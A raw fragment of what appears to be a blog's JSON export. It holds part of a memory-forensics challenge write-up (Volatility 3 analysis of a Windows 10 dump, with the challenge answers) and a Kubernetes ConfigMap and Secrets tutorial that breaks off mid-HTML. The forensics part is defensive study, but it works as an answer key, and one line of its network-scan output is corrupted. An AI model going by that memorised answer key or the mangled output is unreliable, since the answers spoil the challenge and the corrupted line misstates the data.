class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED | <span class=\"built_in\">wc</span> -l</span><br><span class=\"line\"></span><br><span class=\"line\">10</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 10</p>\n</div>\n<blockquote>\n<p>5- What FQDN does Chrome have an established network connection with?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan | grep -i chrome</span><br><span class=\"line\">0xbf0f6a896ae0.0TCPv4   10.0.2.15DB scan49773fin185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6c85bb20  TCPv4   10.0.2.15       49775   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6ca71a20  TCPv4   10.0.2.15       49769   142.250.190.14  443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:55</span><br><span class=\"line\">0xbf0f6cbb9530  TCPv4   10.0.2.15       49772   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6cfd17f0  TCPv4   10.0.2.15       49777   35.186.220.63   443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6d51c010  TCPv4   10.0.2.15       49763   172.217.4.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:53</span><br><span class=\"line\">0xbf0f6d5c8a70  TCPv4   10.0.2.15       49797   172.217.4.74    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:48:27</span><br><span class=\"line\">0xbf0f6d5d1ac0  TCPv4   10.0.2.15       49770   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:57</span><br><span class=\"line\">0xbf0f6d8a1010  TCPv4   10.0.2.15       49771   185.70.41.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:57</span><br></pre></td></tr></table></figure>\n<p>Wow man! we found a single established connection with IP  <code>185.70.41.130</code> <br>\nI used a random website that give me the FQDN from the IP address!</p>\n<p><img data-src=\"https://imgur.com/XJSnlsS.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  <code>protonmail.ch</code></p>\n</div>\n<blockquote>\n<p>6- What is the MD5 hash value of process executable for PID 6988?</p>\n</blockquote>\n<p>Let’s dump the executable of the process with pid 6988, I used to do that with  <code>procdump</code>  plugin with volatility2, but this time i am trying to use volatility3 so with somesearch i found that  <code>windows.pslist</code>  plugin has  <code>--dump</code>  argument that can dump the excutable of the process. Let’s do it !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dump </span><br><span class=\"line\">Volatility 3 Framework 2.2.0</span><br><span class=\"line\">Progress:  100.00               PDB scanning finished</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output</span><br><span class=\"line\"></span><br><span class=\"line\">6988    4352    OneDrive.exe    0xbf0f6d4262c0  26      -       1       True    2021-04-30 17:40:01     N/A     pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to use  <code>md5sum</code>  to get the md5 hash of the executable!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">md5sum</span> pid.6988.0x1c0000.dmp</span><br><span class=\"line\">0b493d8e26f03ccd2060e0be85f430af  pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 0b493d8e26f03ccd2060e0be85f430af</p>\n</div>\n<blockquote>\n<p>7- What is the word starting at offset 0x45BE876 with a length of 6 bytes?<br>\nOK we need to know the word at offset 0x45BE876! we can do it using  <code>xxd</code>  just we start from this offest and stop after 6 bytes! to specify the offset that you want to start from it just use  <code>-s</code>  options and to specify the length to display use  <code>-l</code>  option</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxd -g1 --s 0x45be876 -l 6 20210430-Win10Home-20H2-64bit-memdump.mem </span><br><span class=\"line\">045be876: 68 61 63 6b 65 72                                hacker</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: hacker</p>\n</div>\n<blockquote>\n<p>8- What is the creation date and time of the parent process of “powershell.exe”? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We need to know the parent process of powershell! we can do it using  <code>pslist</code>  and check the  <code>PPID</code> . But I’ll go with  <code>pstree</code>  plugin! it will make it easier for me. I don’t want to waste my time searching at the parent process using PPID !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pstree |  grep -i powershell -B 4</span><br><span class=\"line\">* 564   668     LogonUI.exe     0xbf0f6b7b7100  0       -       1       False   2021-04-30 12:39:44      2021-04-30 17:39:58</span><br><span class=\"line\">* 4296  668     userinit.exe    0xbf0f6ca8f080  0       -       1       False   2021-04-30 17:39:48      2021-04-30 17:40:12</span><br><span class=\"line\">** 4352 4296    explorer.exe    0xbf0f6ca662c0  82      -       1       False   2021-04-30 17:39:48      N/A</span><br><span class=\"line\">*** 6884        4352    VBoxTray.exe    0xbf0f6d186080  11      -       1       False   2021-04-30 17:40:01      N/A</span><br><span class=\"line\">*** 5096        4352    powershell.exe  0xbf0f6d97f2c0  12      -       1       False   2021-04-30 17:51:19      N/A</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 2021-04-30 17:39:48</p>\n</div>\n<blockquote>\n<p>9- What is the full path and name of the last file opened in notepad?</p>\n</blockquote>\n<p>Notepad is an executable that use the file as an argument ! so  <code>cmdline</code>  plugin will help us the get the files opened with notepad !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep -i notepad   </span><br><span class=\"line\">2520 notepad.exe     <span class=\"string\">&quot;C:\\Windows\\system32\\NOTEPAD.EXE&quot;</span> C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</p>\n</div>\n<blockquote>\n<p>10- How long did the suspect use Brave browser? (hh:mm:ss)</p>\n</blockquote>\n<p>Let me tell you something! When we speak about more details about system apps nothing will be usefull more than the windows registries! One of the most important registries is  <code>UserAssist</code> <br>\nThe  <code>UserAssist</code>  key, a part of Microsoft Windows registry, records the information related to programs run by a user on a Windows system</p>\n<p>Volatility is powerful! we can use the  <code>userassist</code>  plugin to get what we want!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep -i brave </span><br><span class=\"line\">* 0xa80333cda0000       \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Temp\\GUM20E0.tmp\\BraveUpdate.exe N/A      0       0       0:00:03  N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Update\\BraveUpdate.exe     N/A   0:00:24.797000   N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   Brave   N/A     9       22      4:01:54  2021-04-30 17:48:45</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;F4E57C4B-2036-45F0-A9AB-443BCFE33D9F&#125;\\Count  2021-04-30 17:51:18      Value   C:\\Users\\Public\\Desktop\\Brave.lnk       N/A     8       0     0:00:00.508000   2021-04-30 17:48:45</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  04:01:54</p>\n</div>\n"},{"title":"Introduction To Configmap & Secrets","date":"2022-09-06T10:29:37.000Z","cover":"https://kruschecompany.com/wp-content/uploads/2019/08/01-1280x595.png","_content":"## An introduction to Kubernetes Secrets and ConfigMaps\nKubernetes has two types of objects that can inject configuration data into a container when it starts up: Secrets and ConfigMaps. Secrets and ConfigMaps behave similarly in Kubernetes, both in how they are created and because they can be exposed inside a container as mounted files or volumes or environment variables.\n\n### To understand more how configmap and secrets are important let's consider the following scenario:\nYou have to run a postgres docker image on your host, you explore the documentation of this docker image provided in *[DockerHub](\"https://hub.docker.com/_/postgres\")* and you find that you the PostgreSQL image uses several environment variables and there is a mandatory variable called `POSTGRES_PASSWORD` must be defined by running this following command:\n``` bash\n$  docker run --name my-postgres -e POSTGRES_PASSWORD=mypassword -d postgres\n```\n### But how we can use this environment variables and how we can manage them in kubernetes ?\nWe can centralize the variables environment in two types of objects and import these variables in the manifest of a pod, replicasets, or deployments\n\n### What is a ConfigMaps\nIn Kubernetes, a ConfigMap is nothing more than a key/value pair. A ConfigMap store’s non-confidential data, meaning no passwords or API keys. Pods can consume ConfigMaps as environment variables, command-line arguments, or as configuration files in a volume.\n\nA ConfigMap allows you to decouple environment-specific configuration from your container images, so that your applications are easily portable.\n\n#### Example of confimap manifest that store the database name & username: \n\n``` yaml \napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: config-map\ndata:\n  postgres-db: \"database\"\n  postgres-user: \"mohamed\"\n```\n#### Create the ConfigMaps Object:\n``` bash\njustk8s@justk8s-master:~$ kubectl apply -f first-configmap.yaml\nconfigmap/config-map created\n```\n#### List the ConfigMap Objects:\n``` bash\njustk8s@justk8s-master:~$ kubectl get configmap\nNAME               DATA   AGE\nconfig-map         2      26s\nkube-root-ca.crt   1      13h\n```\n\n### What is a Secrets:\nSecrets are a Kubernetes object intended for storing a small amount of sensitive data. It is worth noting that Secrets are stored base64-encoded within Kubernetes, so they are not wildly secure.\nSecrets are similar to ConfigMaps but are specifically intended to hold confidential data.\n\n#### Example of confimap manifest that store the database password:\nwe must encode the value that we will stored in the Secrets\n\n``` bash \njustk8s@justk8s-master:~$ echo -n \"mohamed\" | base64\nbW9oYW1lZA==\n```\nNow we can use the base64 cipher in the Secret manifest\n``` yaml\napiVersion: v1\nkind: Secret\nmetadata:\n  name: database-secret\ntype: Opaque\ndata:\n  postgres-pass: \"bW9oYW1lZA==\"\n```\n#### Create the ConfigMaps Object:\n``` bash\njustk8s@justk8s-master:~$ kubectl apply -f first-secret.yaml\nsecret/database-secret created\n```\n#### List the ConfigMap Objects:\n``` bash\njustk8s@justk8s-master:~$ kubectl get secrets\nNAME                  TYPE                                  DATA   AGE\ndatabase-secret       Opaque                                1      8s\ndefault-token-xl8sl   kubernetes.io/service-account-token   3      13h\n```\n### How to use ConfigMaps and Secrets values in a Pod\nwe can use the values from `ConfigMaps` and `Secrets` in the pod manifests in the `env` propriety of the container by using the `valueFrom` field that can import values from configMap and Secrets\n``` yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: <pod-name>\nspec:\n  containers:\n    - name: <name>\n      image: <image>\n      env:\n        # Define the environment variable\n        - name: <variable-name>\n          valueFrom:\n            configMapKeyRef:\n              name: <config-map-object>     \n              key: <key-name>\n        - name: <variable-name>\n          valueFrom:\n            secretKeyRef:\n              name: <secret-object>     \n              key: <key-name>\n```\n\n### Create a PostgreSQL Pod that uses values from ConfigMaps and Secrets\n#### 1- Create the Pod manifest:\n``` yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: postgresql\nspec:\n  containers:\n    - name: postgres\n      image: postgres\n      ports:\n        - containerPort: 5432\n      env:\n        # Define the environment variable\n        - name: POSTGRES_USER\n          valueFrom:\n            configMapKeyRef:\n              name: config-map   \n              key: postgres-user\n\n        - name: POSTGRES_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              name: config-map   \n              key: postgres-db\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: database-secret   \n              key: postgres-pass\n\n```\n#### 2- Create the Pod:\n``` bash \njustk8s@justk8s-master:~$ kubectl apply -f postgres.yaml\npod/postgresql created\n```\n#### 3- List The Created Pod:\n``` bash \njustk8s@justk8s-master:~$ kubectl get pods\n\nNAME         READY   STATUS    RESTARTS   AGE\npostgresql   1/1     Running   0          8s\n```\n\n#### 4- Test the Database created with variables of ConfigMap and Secrets:\nWe can open a bash session on the pod and open the database `mohamed` with the `psql` command provided by the postgreSQL\n``` bash\njustk8s@justk8s-master:~$ kubectl exec --stdin --tty postgresql  -- /bin/bash\n\nroot@postgresql:/# psql -U \"mohamed\"\npsql (14.4 (Debian 14.4-1.pgdg110+1))\nType \"help\" for help.\n\nmohamed=#\n```\n\n\n#### References:\n *[Get a Shell to a Running Container](https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/)*\n\n*[ConfigMaps](https://kubernetes.io/docs/concepts/configuration/configmap/)*\n\n*[Secrets](https://kubernetes.io/docs/concepts/configuration/secret/)*\n\n*[PostgreSQL Docker](https://hub.docker.com/_/postgres)*","source":"_posts/Kubernetes/configmap-secrets.md","raw":"---\ntitle: Introduction To Configmap & Secrets\ndate: 2022-09-06 11:29:37\ntags:\ncover: https://kruschecompany.com/wp-content/uploads/2019/08/01-1280x595.png\ncategories:\n- [Kubernetes]\n#https://miro.medium.com/max/1400/0*E6s0y6uIDi9X68XB.png\n---\n## An introduction to Kubernetes Secrets and ConfigMaps\nKubernetes has two types of objects that can inject configuration data into a container when it starts up: Secrets and ConfigMaps. Secrets and ConfigMaps behave similarly in Kubernetes, both in how they are created and because they can be exposed inside a container as mounted files or volumes or environment variables.\n\n### To understand more how configmap and secrets are important let's consider the following scenario:\nYou have to run a postgres docker image on your host, you explore the documentation of this docker image provided in *[DockerHub](\"https://hub.docker.com/_/postgres\")* and you find that you the PostgreSQL image uses several environment variables and there is a mandatory variable called `POSTGRES_PASSWORD` must be defined by running this following command:\n``` bash\n$  docker run --name my-postgres -e POSTGRES_PASSWORD=mypassword -d postgres\n```\n### But how we can use this environment variables and how we can manage them in kubernetes ?\nWe can centralize the variables environment in two types of objects and import these variables in the manifest of a pod, replicasets, or deployments\n\n### What is a ConfigMaps\nIn Kubernetes, a ConfigMap is nothing more than a key/value pair. A ConfigMap store’s non-confidential data, meaning no passwords or API keys. Pods can consume ConfigMaps as environment variables, command-line arguments, or as configuration files in a volume.\n\nA ConfigMap allows you to decouple environment-specific configuration from your container images, so that your applications are easily portable.\n\n#### Example of confimap manifest that store the database name & username: \n\n``` yaml \napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: config-map\ndata:\n  postgres-db: \"database\"\n  postgres-user: \"mohamed\"\n```\n#### Create the ConfigMaps Object:\n``` bash\njustk8s@justk8s-master:~$ kubectl apply -f first-configmap.yaml\nconfigmap/config-map created\n```\n#### List the ConfigMap Objects:\n``` bash\njustk8s@justk8s-master:~$ kubectl get configmap\nNAME               DATA   AGE\nconfig-map         2      26s\nkube-root-ca.crt   1      13h\n```\n\n### What is a Secrets:\nSecrets are a Kubernetes object intended for storing a small amount of sensitive data. It is worth noting that Secrets are stored base64-encoded within Kubernetes, so they are not wildly secure.\nSecrets are similar to ConfigMaps but are specifically intended to hold confidential data.\n\n#### Example of confimap manifest that store the database password:\nwe must encode the value that we will stored in the Secrets\n\n``` bash \njustk8s@justk8s-master:~$ echo -n \"mohamed\" | base64\nbW9oYW1lZA==\n```\nNow we can use the base64 cipher in the Secret manifest\n``` yaml\napiVersion: v1\nkind: Secret\nmetadata:\n  name: database-secret\ntype: Opaque\ndata:\n  postgres-pass: \"bW9oYW1lZA==\"\n```\n#### Create the ConfigMaps Object:\n``` bash\njustk8s@justk8s-master:~$ kubectl apply -f first-secret.yaml\nsecret/database-secret created\n```\n#### List the ConfigMap Objects:\n``` bash\njustk8s@justk8s-master:~$ kubectl get secrets\nNAME                  TYPE                                  DATA   AGE\ndatabase-secret       Opaque                                1      8s\ndefault-token-xl8sl   kubernetes.io/service-account-token   3      13h\n```\n### How to use ConfigMaps and Secrets values in a Pod\nwe can use the values from `ConfigMaps` and `Secrets` in the pod manifests in the `env` propriety of the container by using the `valueFrom` field that can import values from configMap and Secrets\n``` yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: <pod-name>\nspec:\n  containers:\n    - name: <name>\n      image: <image>\n      env:\n        # Define the environment variable\n        - name: <variable-name>\n          valueFrom:\n            configMapKeyRef:\n              name: <config-map-object>     \n              key: <key-name>\n        - name: <variable-name>\n          valueFrom:\n            secretKeyRef:\n              name: <secret-object>     \n              key: <key-name>\n```\n\n### Create a PostgreSQL Pod that uses values from ConfigMaps and Secrets\n#### 1- Create the Pod manifest:\n``` yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: postgresql\nspec:\n  containers:\n    - name: postgres\n      image: postgres\n      ports:\n        - containerPort: 5432\n      env:\n        # Define the environment variable\n        - name: POSTGRES_USER\n          valueFrom:\n            configMapKeyRef:\n              name: config-map   \n              key: postgres-user\n\n        - name: POSTGRES_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              name: config-map   \n              key: postgres-db\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: database-secret   \n              key: postgres-pass\n\n```\n#### 2- Create the Pod:\n``` bash \njustk8s@justk8s-master:~$ kubectl apply -f postgres.yaml\npod/postgresql created\n```\n#### 3- List The Created Pod:\n``` bash \njustk8s@justk8s-master:~$ kubectl get pods\n\nNAME         READY   STATUS    RESTARTS   AGE\npostgresql   1/1     Running   0          8s\n```\n\n#### 4- Test the Database created with variables of ConfigMap and Secrets:\nWe can open a bash session on the pod and open the database `mohamed` with the `psql` command provided by the postgreSQL\n``` bash\njustk8s@justk8s-master:~$ kubectl exec --stdin --tty postgresql  -- /bin/bash\n\nroot@postgresql:/# psql -U \"mohamed\"\npsql (14.4 (Debian 14.4-1.pgdg110+1))\nType \"help\" for help.\n\nmohamed=#\n```\n\n\n#### References:\n *[Get a Shell to a Running Container](https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/)*\n\n*[ConfigMaps](https://kubernetes.io/docs/concepts/configuration/configmap/)*\n\n*[Secrets](https://kubernetes.io/docs/concepts/configuration/secret/)*\n\n*[PostgreSQL Docker](https://hub.docker.com/_/postgres)*","slug":"Kubernetes/configmap-secrets","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxnf000ad5qf4ddigtnv","content":"<h2 id=\"an-introduction-to-kubernetes-secrets-and-configmaps\"><a class=\"markdownIt-Anchor\" href=\"#an-introduction-to-kubernetes-secrets-and-configmaps\">#</a> An introduction to Kubernetes Secrets and ConfigMaps</h2>\n<p>Kubernetes has two types of objects that can inject configuration data into a container when it starts up: Secrets and ConfigMaps. Secrets and ConfigMaps behave similarly in Kubernetes, both in how they are created and because they can be exposed inside a container as mounted files or volumes or environment variables.</p>\n<h3 id=\"to-understand-more-how-configmap-and-secrets-are-important-lets-consider-the-following-scenario\"><a class=\"markdownIt-Anchor\" href=\"#to-understand-more-how-configmap-and-secrets-are-important-lets-consider-the-following-scenario\">#</a> To understand more how configmap and secrets are important let’s consider the following scenario:</h3>\n<p>You have to run a postgres docker image on your host, you explore the documentation of this docker image provided in <em><a href=\"%22https://hub.docker.com/_/postgres%22\">DockerHub</a></em> and you find that you the PostgreSQL image uses several environment variables and there is a mandatory variable called  <code>POSTGRES_PASSWORD</code>  must be defined by running this following command:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$  docker run --name my-postgres -e POSTGRES_PASSWORD=mypassword -d postgres</span><br></pre></td></tr></table></figure>\n<h3 id=\"but-how-we-can-use-this-environment-variables-and-how-we-can-manage-them-in-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#but-how-we-can-use-this-environment-variables-and-how-we-can-manage-them-in-kubernetes\">#</a> But how we can use this environment variables and how we can manage them in kubernetes ?</h3>\n<p>We can centralize the variables environment in two types of objects and import these variables in the manifest of a pod, replicasets, or deployments</p>\n<h3 id=\"what-is-a-configmaps\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-configmaps\">#</a> What is a ConfigMaps</h3>\n<p>In Kubernetes, a ConfigMap is nothing more than a key/value pair. A ConfigMap store’s non-confidential data, meaning no passwords or API keys. Pods can consume ConfigMaps as environment variables, command-line arguments, or as configuration files in a volume.</p>\n<p>A ConfigMap allows you to decouple environment-specific configuration from your container images, so that your applications are easily portable.</p>\n<h4 id=\"example-of-confimap-manifest-that-store-the-database-name-username\"><a class=\"markdownIt-Anchor\" href=\"#example-of-confimap-manifest-that-store-the-database-name-username\">#</a> Example of confimap manifest that store the database name &amp; username:</h4>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ConfigMap</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">config-map</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-db:</span> <span class=\"string\">&quot;database&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-user:</span> <span class=\"string\">&quot;mohamed&quot;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"create-the-configmaps-object\"><a class=\"markdownIt-Anchor\" href=\"#create-the-configmaps-object\">#</a> Create the ConfigMaps Object:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f first-configmap.yaml</span><br><span class=\"line\">configmap/config-map created</span><br></pre></td></tr></table></figure>\n<h4 id=\"list-the-configmap-objects\"><a class=\"markdownIt-Anchor\" href=\"#list-the-configmap-objects\">#</a> List the ConfigMap Objects:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get configmap</span><br><span class=\"line\">NAME               DATA   AGE</span><br><span class=\"line\">config-map         2      26s</span><br><span class=\"line\">kube-root-ca.crt   1      13h</span><br></pre></td></tr></table></figure>\n<h3 id=\"what-is-a-secrets\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-secrets\">#</a> What is a Secrets:</h3>\n<p>Secrets are a Kubernetes object intended for storing a small amount of sensitive data. It is worth noting that Secrets are stored base64-encoded within Kubernetes, so they are not wildly secure.<br>\nSecrets are similar to ConfigMaps but are specifically intended to hold confidential data.</p>\n<h4 id=\"example-of-confimap-manifest-that-store-the-database-password\"><a class=\"markdownIt-Anchor\" href=\"#example-of-confimap-manifest-that-store-the-database-password\">#</a> Example of confimap manifest that store the database password:</h4>\n<p>we must encode the value that we will stored in the Secrets</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;mohamed&quot;</span> | <span class=\"built_in\">base64</span></span><br><span class=\"line\">bW9oYW1lZA==</span><br></pre></td></tr></table></figure>\n<p>Now we can use the base64 cipher in the Secret manifest</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Secret</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">database-secret</span></span><br><span class=\"line\"><span class=\"attr\">type:</span> <span class=\"string\">Opaque</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-pass:</span> <span class=\"string\">&quot;bW9oYW1lZA==&quot;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"create-the-configmaps-object-2\"><a class=\"markdownIt-Anchor\" href=\"#create-the-configmaps-object-2\">#</a> Create the ConfigMaps Object:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f first-secret.yaml</span><br><span class=\"line\">secret/database-secret created</span><br></pre></td></tr></table></figure>\n<h4 id=\"list-the-configmap-objects-2\"><a class=\"markdownIt-Anchor\" href=\"#list-the-configmap-objects-2\">#</a> List the ConfigMap Objects:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get secrets</span><br><span class=\"line\">NAME                  TYPE                                  DATA   AGE</span><br><span class=\"line\">database-secret       Opaque                                1      8s</span><br><span class=\"line\">default-token-xl8sl   kubernetes.io/service-account-token   3      13h</span><br></pre></td></tr></table></figure>\n<h3 id=\"how-to-use-configmaps-and-secrets-values-in-a-pod\"><a class=\"markdownIt-Anchor\" href=\"#how-to-use-configmaps-and-secrets-values-in-a-pod\">#</a> How to use ConfigMaps and Secrets values in a Pod</h3>\n<p>we can use the values from  <code>ConfigMaps</code>  and  <code>Secrets</code>  in the pod manifests in the  <code>env</code>  propriety of the container by using the  <code>valueFrom</code>  field that can import values from configMap and Secrets</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 